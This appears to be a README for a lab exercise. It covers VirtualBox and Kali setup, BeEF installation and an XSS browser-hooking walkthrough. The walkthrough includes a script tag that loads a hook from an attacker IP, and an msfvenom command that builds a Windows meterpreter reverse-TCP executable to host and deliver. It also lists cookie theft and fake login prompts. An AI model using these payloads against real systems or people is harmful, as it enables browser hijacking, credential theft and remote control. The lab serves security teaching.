BeEF (Browser Exploitation Framework) is a penetration testing tool focusing on web browsers. It "hooks" a target’s browser
# BeEF-XSS – Ethical Hacking & Browser Exploitation Lab

This project demonstrates how to use the **Browser Exploitation Framework (BeEF)** with **Cross-Site Scripting (XSS)** vulnerabilities to simulate client-side attacks in a controlled, ethical hacking environment.

> ⚠️ **Disclaimer**: This lab is intended for educational and authorized penetration testing purposes only. Do not use these techniques on systems you do not own or have explicit permission to test.

---

## Chapter 1: Setting Up the Virtual Lab

We create a safe, isolated environment for ethical hacking and browser exploitation:

### Required Virtual Machines

- **Kali Linux** (Attacker Machine)
- **Ubuntu Desktop VMs** (Victim Machines)
- **Metasploitable2** (Vulnerable Linux Server)

### Tool: VirtualBox

VirtualBox is a free and open-source virtualization tool to run our VMs.

1. Download from [https://www.virtualbox.org/wiki/Downloads](https://www.virtualbox.org/wiki/Downloads)
2. Install and create virtual machines with proper specs.
3. Configure **networking**: Use "Internal Network" for isolated attack scenarios.

<img width="1603" height="1022" alt="Screenshot 2025-09-04 183406" src="https://github.com/user-attachments/assets/f11cd28a-cc7a-4c34-bebe-6b436619d42d" />

---

## Chapter 2: Installing Kali Linux

### Method 1: Dual Boot (Windows + Kali Linux)

- Use **Rufus** to create bootable USB.
- Shrink Windows partition (30–50GB).
- Install Kali from USB.
- Setup GRUB bootloader to dual boot between Windows and Kali.

### Method 2: VirtualBox (Recommended)

1. Download Kali VirtualBox image from [https://www.kali.org](https://www.kali.org)
2. Import `.ova` file into VirtualBox.
3. Set **network to Internal Network**.
4. Boot up Kali Linux VM.

<img width="1548" height="1016" alt="Screenshot 2025-09-04 184042" src="https://github.com/user-attachments/assets/b2a14f99-8acc-40ba-80e3-9002b5fa5851" />

> Fix sources with:
```bash
sudo nano /etc/apt/sources.list
```
### Add:

deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware
```bash
sudo apt update && sudo apt full-upgrade -y
```

# Chapter 3: BeEF-XSS – Complete Guide

## What is BeEF?
BeEF (**Browser Exploitation Framework**) is a penetration testing tool that focuses on **client-side attacks** via web browsers.

**XSS (Cross-Site Scripting)** allows attackers to inject malicious scripts into web pages.

---

## Why Use BeEF-XSS?
- Demonstrates **real-world XSS attack scenarios**  
- Helps understand **browser exploitation & social engineering**  
- Shows **why front-end security matters**  

---

## ⚙️ Installing BeEF on Kali Linux

### Step 1: Check if Install
```bash
beef-xss
```
If it starts : you’re good! Jump to “Running BeEF”.
If command not found, install it.
Install it from the kali repository:
Use /root command  in command prompt/Terminal 
```bash
$ Sudo su
```
Or open root command prompt/Terminal 
After to use the installation command 
```bash
$ Sudo apt install beef-xss -y
```
This installs the latest stable version of BeEF on Kali Linux.

<img width="1324" height="712" alt="Screenshot 2025-09-04 184325" src="https://github.com/user-attachments/assets/70847c50-60ff-4c99-a644-a10a563e2d42" />

If not found, install it:
```bash
sudo apt update && sudo apt install beef-xss -y
```
### Step 2: Change Default Credentials
```bash
sudo nano /etc/beef-xss/config.yaml
# Change username and password here
```


### Step 3: Start BeEF
```bash
sudo service beef-xss start
```

Open in browser:
http://localhost:3000/ui/panel

Default credentials:
Running BeEF-XSS
 To change the password to BeEF-XSS. To enter the command and change because of to secured the BeEF and also prepare for the attacks.
```bash
$ nano /etc/beef-xss/config.yaml

Username: beef  
Password: beef
```

<img width="1542" height="1020" alt="Screenshot 2025-09-04 184403" src="https://github.com/user-attachments/assets/08a7624b-6b1a-4dd1-96b0-90554293d4e1" />

## Hooking a Browser

<img width="1598" height="1018" alt="Screenshot 2025-09-05 102448" src="https://github.com/user-attachments/assets/10a6109a-4f97-4964-9c6f-82a54fa45233" />
<img width="1068" height="811" alt="Screenshot 2025-09-05 102733" src="https://github.com/user-attachments/assets/190e4ff4-db78-48a3-af92-2b54be6c79e3" />
<img width="1059" height="610" alt="Screenshot 2025-09-05 103440" src="https://github.com/user-attachments/assets/b7d7805d-5623-41eb-a334-fe710a9bba2e" />


Inject this payload via an XSS vulnerability:
```bash
<script src="http://<attacker-ip>:3000/hook.js"></script>
```


Once executed, the victim’s browser connects to BeEF and appears in the control panel.

From there, you can:

Steal cookies

Create fake login prompts

Scan internal networks

Launch social engineering attacks

# Sample Payload with Metasploit (msfvenom)
### Step 1: Create Payload

<img width="954" height="1014" alt="Screenshot 2025-09-13 125820" src="https://github.com/user-attachments/assets/fd9fddc0-3733-4136-9374-d7eb4fa83c2b" />
<img width="949" height="516" alt="Screenshot 2025-09-13 130038" src="https://github.com/user-attachments/assets/6c6d63e8-cda0-4b4b-bef0-bdd04135f959" />


```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.10 lport=4444 -f exe > payload.exe
```
### Step 2: Host the Payload
```bash
mv payload.exe /var/www/html/
```

Send the link using BeEF’s social engineering modules.
